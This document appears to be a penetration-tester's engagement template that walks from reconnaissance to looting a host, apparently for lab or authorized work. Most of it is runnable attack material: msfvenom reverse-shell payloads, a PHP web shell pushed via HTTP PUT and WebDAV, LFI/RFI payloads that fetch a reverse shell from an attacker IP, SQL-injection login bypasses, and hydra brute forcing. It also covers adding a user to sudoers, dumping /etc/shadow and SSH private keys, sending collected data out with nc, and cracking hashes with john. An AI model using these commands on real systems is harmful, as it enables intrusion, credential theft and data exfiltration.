# Info-sheet
msfvenom -p linux/x86/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=4444 -f elf -o shell.elf

- DNS-Domain name:
- Host name:
- OS:
- Server:
- Kernel:
- Workgroup:
- Windows domain:
- Services and ports:

INSERTTCPSCAN

### Full TCP Scan

INSERTFULLTCPSCAN

### Full UDP Scan

INSERTUDPSCAN

### Vuln Scan

INSERTVULNSCAN

```
Always start with a stealthy scan to avoid closing ports.

# Syn-scan
nmap -sS INSERTIPADDRESS

# Scan all ports, might take a while.
nmap INSERTIPADDRESS -p-

# Service-version, default scripts, OS:
nmap INSERTIPADDRESS -sV -sC -O -p 111,222,333

# Scan for UDP
nmap INSERTIPADDRESS -sU
unicornscan -mU -v -I INSERTIPADDRESS

# Connect to udp if one is open
nc -u INSERTIPADDRESS 48772

# Monster scan
nmap INSERTIPADDRESS -p- -A -T4 -sC

# Vulnerability Scan
nmap --script=vuln INSERTIPADDRESS
```


### Port 21 - FTP

- FTP-Name:
- FTP-version:
- Anonymous login:

INSERTFTPTEST

```
nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 INSERTIPADDRESS
```

### Port 22 - SSH

- Name:
- Version:
- Takes-password:
- If you have usernames test login with username:username

INSERTSSHCONNECT

INSERTSSHBRUTE

```
hydra -I -t 5 -l username -P password ssh://INSERTIPADDRESS
nc INSERTIPADDRESS 22
```

### Port 25 - SMTP

- Name:
- Version:
- VRFY:

INSERTSMTPCONNECT

```
nc -nvv INSERTIPADDRESS 25
HELO foo<cr><lf>

telnet INSERTIPADDRESS 25
VRFY root

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 INSERTIPADDRESS
```

### Port 69 - UDP - TFTP

This is used for tftp-server.

### Port 110 - Pop3

- Name:
- Version:

INSERTPOP3CONNECT

```
telnet INSERTIPADDRESS 110
USER pelle@INSERTIPADDRESS
PASS admin

or:

USER pelle
PASS admin

# List all emails
list

# Retrieve email number 5, for example
retr 9
```

### Port 111 - Rpcbind

```
rpcinfo -p INSERTIPADDRESS
```


### Port 135 - MSRPC

INSERTRPCMAP

### Port 143 - Imap

### Port 139/445 

### SMBmap
INSERTSMBMAP

```
mkdir /tmp/share
mount -t cifs //INSERTIPADDRESS/C$ /tmp/share
```

### Password Policy
INSERTSAMRDUMP

```
nmap --script=smb-* INSERTIPADDRESS -p 445


enum4linux -a INSERTIPADDRESS
rpcclient -U "" INSERTIPADDRESS
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall

smbclient -L INSERTIPADDRESS
smbclient //INSERTIPADDRESS/tmp
smbclient //INSERTIPADDRESS/ipc$ 
smbclient //INSERTIPADDRESS/admin$
smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
smbclient //INSERTIPADDRESS/ipc$ -U john  
```

### Port 161/162 UDP - SNMP

Look for installed programs and other ports that are opened and may have been missed

```
nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes INSERTIPADDRESS
onesixtyone -c /root/Dropbox/Wordlists/wordlist-common-snmp-community-strings.txt INSERTIPADDRESS
snmp-check INSERTIPADDRESS -c public
```

```
# Common community strings
public
private
community
```

INSERTSNMPSCAN

### Port 443 - HTTPS

INSERTSSLSCAN

```
# Heartbleed
sslscan INSERTIPADDRESS:443
```

### Port 554 - RTSP


### Port 1030/1032/1033/1038

Used by RPC to connect in domain network.

### Port 1521 - Oracle

- Name:
- Version:
- Password protected:

```
tnscmd10g version -h INSERTIPADDRESS
tnscmd10g status -h INSERTIPADDRESS
```

### Port 2049 - NFS

INSERTNFSSCAN

```
showmount -e INSERTIPADDRESS

If you find anything you can mount it like this:

mount INSERTIPADDRESS:/ /tmp/NFS
mount -t INSERTIPADDRESS:/ /tmp/NFS
```

### Port 2100 - Oracle XML DB

- Name:
- Version:
- Default logins:

```
sys:sys
scott:tiger
```

Default passwords
https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm

### 3306 - MySQL

- Name:
- Version:

```
nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse INSERTIPADDRESS -p 3306

mysql --host=INSERTIPADDRESS -u root -p
```

### Port 3339 - Oracle web interface

- Basic info about web service (apache, nginx, IIS)
- Server:
- Scripting language:
- Apache Modules:
- IP-address:

## Webservers 

### Automated Checks

INSERTWIGSCAN

INSERTWIGSSLSCAN

### Nikto scan

INSERTNIKTOSCAN

### Directories

INSERTDIRBSCAN

INSERTDIRBSSLSCAN

### Robots

INSERTROBOTS

### Default/Weak login

Google documentation for default passwords and test them:

```
site:webapplication.com password
https://cirt.net/passwords
```

```
admin admin
admin password
admin <blank>
admin nameofservice
root root
root admin
root password
root nameofservice
<username if you have> password
<username if you have> admin
<username if you have> username
<username if you have> nameofservice
```
```
Step 3: 
Browse around and look for disclosed PII on site

*Place anything here
```

### Manual Checks

```
Step 1:
View Source

Step 2: 
Start Secondary Scans
```
gobuster -u http://INSERTIPADDRESS -e -f -n -w /usr/share/wordlists/dirb/big.txt
gobuster -u INSERTIPADDRESS -w /usr/share/wordlists/dirb/common.txt -t 100 -x .php,.html,.asp
wig-git http://INSERTIPADDRESS/path
```
# CMS checker 
cmsmap-git -t http://INSERTIPADDRESS

#Full Nikto
nikto -h http://INSERTIPADDRESS

# Nikto with squid proxy
nikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:4444

# Get header
curl -i INSERTIPADDRESS

# Get everything
curl -i -L INSERTIPADDRESS

# Check if it is possible to upload using put
curl -v -X OPTIONS http://INSERTIPADDRESS/
curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php

# Check for title and all links
dotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o unix

#To append a .pl to the end of the resolutions:
dirb http://INSERTIPADDRESS/somedirectory -X .pl

```

### WebDav

```
Try to put a shell.php

cd /root/Dropbox/Engagements/INSERTIPADDRESS/exploit && msfvenom -p linux/x86/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f php -o shell.php

cadaver INSERTIPADDRESS

put /root/Dropbox/Engagements/INSERTIPADDRESS/exploit/shell.php
If the .asp extention is not allowed, try shell.asp.txt and use the mv command

user: wampp
pass: xampp 
```

### LFI/RFI

```
fimap -u "http://INSERTIPADDRESS/example.php?test="
http://kaoticcreations.blogspot.com/2011/08/automated-lfirfi-scanning-exploiting.html

# Checks
http://INSERTIPADDRESS/gallery.php?page=/etc/passwd
http://INSERTIPADDRESS/gallery.php?page=/etc/passwd%00

http://INSERTIPADDRESS/gallery.php?page=../../../../../../etc/passwd
http://INSERTIPADDRESS/gallery.php?page=../../../../../../etc/passwd%00

http://INSERTIPADDRESS/gallery.php?page=expect://ls
*If you get a warning include() error it is not affected
Else for shell:
POST this with tamper data to http://INSERTIPADDRESS/gallery.php?page=expect://ls
<? system('wget http://10.11.0.150/php-reverse-shell.php -O /var/www/shell.php');?>
Then navigate to
http://INSERTIPADDRESS/shell.php

# Bypass execution
http://INSERTIPADDRESS/index.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
base64 -d output of above

# Remote File Inclusion
python -m SimpleHTTPServer 80
http://INSERTIPADDRESS/page=http://MYIPADDRESS/maliciousfile.php%00
http://INSERTIPADDRESS/page=http://MYIPADDRESS/maliciousfile.php

# Shell Creation
msfvenom -p php/download_exec URL=http://MYIPADDRESS/shell.elf -f raw -o shell.php
msfvenom -p linux/x86/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f elf > shell.elf
python -m SimpleHTTPServer 80

nc -nvlp 443
```

### SQL-Injection

```# Login Bypass
Username/Password: 
1' or '1'='1 
1' or 1=1 LIMIT 1;# 
'or 1=1/*
'or '1'='1' --
'or '1'='1' ({
'or '1'='1' /*

# Post
./sqlmap.py -r search-test.txt -p tfUPass

# Get
sqlmap -u "http://INSERTIPADDRESS/index.php?id=1" --dbms=mysql

# Crawl
sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3
```

### Sql-login-bypass

```
- Open Burp-suite
- Make and intercept a request
- Send to intruder
- Cluster attack.
- Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)
- Attack
- Check for response length variation
```

### Password brute force - last resort

```
cewl http://INSERTIPADDRESS
```

## Vulnerability analysis

Now we have gathered information about the system. Now comes the part where we look for exploits and vulnerabilites and features.

### To try - List of possibilies
Add possible exploits here:



### Find sploits - Searchsploit and google

Where there are many exploits for a software, use google. It will automatically sort it by popularity.

```
site:exploit-db.com apache 2.4.7

# Remove dos-exploits

searchsploit Apache 2.4.7 | grep -v '/dos/'
searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"

# Only search the title (exclude the path), add the -t
searchsploit -t Apache | grep -v '/dos/'
```


----------------------------------------------------------------------------






-----------------------------------------------------------------------------
#Privesc

### First Steps

```
# Jail Break
https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells

# Spawning shell
python -c 'import pty; pty.spawn("/bin/sh")'

# Access to more binaries
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Add user to sudoers
echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers

# Writable directories
/tmp
/var/tmp
Find a writable directory:
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print
find / -user <user>

# Set up webserver
cd /root/Dropbox/Scripts/Post_Linux/Host_Scripts; python -m SimpleHTTPServer 8080

# Download all files
wget http://MYIPADDRESS:8080/ -r; mv MYIPADDRESS:8080 exploits; cd exploits; rm index.html; chmod 700 LinEnum.sh linuxprivchecker.py unix-privesc-check mimipenguin.sh mimipenguin.py

mkdir checks; ./LinEnum.sh -t -k password > checks/linenum && python linuxprivchecker.py extended > checks/linuxpriv && ./unix-privesc-check standard > checks/unixpriv &

#Uploads Files
Host:
cd /root/Dropbox/Engagments/INSERTIPADDRESS/privesc; nc -lvnp 80 > checks.tar.gz

Target:
tar -zcvf checks.tar.gz checks ;nc -nv MYIPADDRESS 80 < checks.tar.gz

```


### Basic info

```
uname -a
env
id
cat /proc/version
cat /etc/issue
cat /etc/passwd
cat /etc/group
cat /etc/shadow
cat /etc/hosts
```

- OS:
- Version:
- Kernel version:
- Architecture:
- Current user:

**Devtools:**
- GCC:
- NC:
- WGET:

### Kernel exploits

```
cd /root/Dropbox/Engagements/INSERTIPADDRESS/exploits && python -m SimpleHTTPServer 80
wget http://MYIPADDRESS/<name>

site:exploit-db.com kernel version

perl /root/Dropbox/Scripts/Post_Linux/linux-exploit-suggester-2/linux-exploit-suggester-2.pl -k 2.6
python /root/Dropbox/Scripts/Post_Linux/AutoLocalPrivilegeEscalation/auto_searchsploit.py 2.6
```

### Programs running as root

Look for webserver, mysql or anything else like that.

```
# Metasploit
ps

# Linux
ps aux
```

### Installed software

```
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
```


### Weak/reused/plaintext passwords

- Check database config-file
- Check databases
- Check weak passwords

```
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
```

- Check plaintext

```
./LinEnum.sh -t -k password 
username
mysql_user
```

### Inside service

```
netstat -anlp
```

### Suid misconfiguration

Binary with suid permission can be run by anyone, but when they are run they are run as root! Editors like nano can then be used to open and edit the /etc/passwd file.

Example programs:

```
nmap (nmap --interactive)
vim
nano
```

```
find / -perm -u=s -type f 2>/dev/null
```


### Unmounted filesystems

Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.

```
mount -l
```

### Cronjob

Look for anything that is owned by privileged user but writable for you

```
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

### SSH Keys

Check all home directories

```
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```


### Bad path configuration

Require user interaction

------------------------------------------------------------------------




----------------------------- LOOT LOOT LOOT LOOT ----------------------




------------------------------------------------------------------------


## Loot

**Checklist**

- Proof:
- Network secret:
- Passwords and hashes:
- Dualhomed:
- Tcpdump:
- Interesting files:
- Databases:
- SSH-keys:
- Browser:
- Mail:


### Proof

```
/root/proof.txt
```

### Network secret

```
/root/network-secret.txt
```

### Passwords and hashes

```
cat /etc/passwd
cat /etc/shadow

unshadow passwd shadow > unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

### Dualhomed

```
ifconfig
ifconfig -a
arp -a
```

### Tcpdump

```
tcpdump -i any -s0 -w capture.pcap
tcpdump -i eth0 -w capture -n -U -s 0 src not 192.168.1.X and dst not 192.168.1.X
tcpdump -vv -i eth0 src not 192.168.1.X and dst not 192.168.1.X
```

### Interesting files

```
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql

.ssh:
.bash_history
```

### Databases

### SSH-Keys

### Browser

### Mail

```
/var/mail
/var/spool/mail
```

### GUI
If there is a gui we want to check out the browser.

```
echo $DESKTOP_SESSION
echo $XDG_CURRENT_DESKTOP
echo $GDMSESSION
```

## How to replicate:
